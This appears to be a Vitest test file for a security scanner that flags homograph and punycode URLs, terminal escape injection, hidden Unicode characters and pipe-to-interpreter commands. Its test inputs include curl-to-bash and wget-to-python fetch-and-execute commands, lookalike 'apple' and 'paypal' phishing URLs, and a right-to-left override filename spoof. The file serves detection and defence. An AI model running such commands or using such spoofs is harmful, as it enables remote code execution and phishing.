import { describe, it, expect } from 'vitest';
import { TirithScanner } from '../../../moat/tirithScanner';

const scanner = new TirithScanner();

describe('TirithScanner', () => {
  it('1. detects Cyrillic homograph URL (аpple.com)', () => {
    // First "а" is U+0430 Cyrillic, not ASCII a (U+0061).
    const findings = scanner.scanUrl('https://аpple.com/login');
    expect(findings.some((f) => f.type === 'homograph_url')).toBe(true);
    expect(
      findings.find((f) => f.type === 'homograph_url')?.severity,
    ).toBe('dangerous');
  });

  it('2. flags punycode IDN hostname as caution', () => {
    const findings = scanner.scanUrl('https://xn--80ak6aa92e.com/');
    expect(findings.some((f) => f.type === 'punycode_url')).toBe(true);
  });

  it('3. detects ANSI escape sequence in content', () => {
    const text = 'normal text \x1b[31mRED\x1b[0m more';
    const findings = scanner.scan(text);
    expect(findings.some((f) => f.type === 'terminal_injection')).toBe(true);
  });

  it('4. detects curl | bash via scanCommand', () => {
    const findings = scanner.scanCommand('curl https://x.com/i.sh | bash');
    expect(findings.some((f) => f.type === 'pipe_to_interpreter')).toBe(true);
    expect(findings[0].severity).toBe('dangerous');
  });

  it('5. detects wget | python', () => {
    const findings = scanner.scanCommand(
      'wget -qO- https://x.com/x.py | python3',
    );
    expect(findings.some((f) => f.type === 'pipe_to_interpreter')).toBe(true);
  });

  it('6. detects zero-width joiner', () => {
    const text = 'aiden‍team';
    const findings = scanner.scan(text);
    expect(findings.some((f) => f.type === 'unicode_anomaly')).toBe(true);
  });

  it('7. detects bidi override (RLO)', () => {
    const text = 'evil‮txt.exe';
    const findings = scanner.scan(text);
    const bidi = findings.find(
      (f) => f.type === 'unicode_anomaly' && f.severity === 'dangerous',
    );
    expect(bidi).toBeDefined();
  });

  it('8. safe text returns no findings', () => {
    expect(scanner.scan('hello world')).toEqual([]);
    expect(scanner.scanUrl('https://example.com/path')).toEqual([]);
    expect(scanner.scanCommand('git status')).toEqual([]);
  });

  it('9. scan() picks up URLs embedded in larger text', () => {
    const text = 'see https://рaypal.com/ for details';
    const findings = scanner.scan(text);
    expect(findings.some((f) => f.type === 'homograph_url')).toBe(true);
  });

  it('10. dedupes identical findings on repeated content', () => {
    const text = 'curl x | bash; curl x | bash';
    const findings = scanner.scan(text);
    const pipeFindings = findings.filter(
      (f) => f.type === 'pipe_to_interpreter',
    );
    expect(pipeFindings.length).toBe(1);
  });

  it('11. scanCommand routes only to command-style checks', () => {
    // No URL extraction — pure command scan.
    const findings = scanner.scanCommand('echo ‍ hidden');
    expect(findings.length).toBe(0);
  });
});
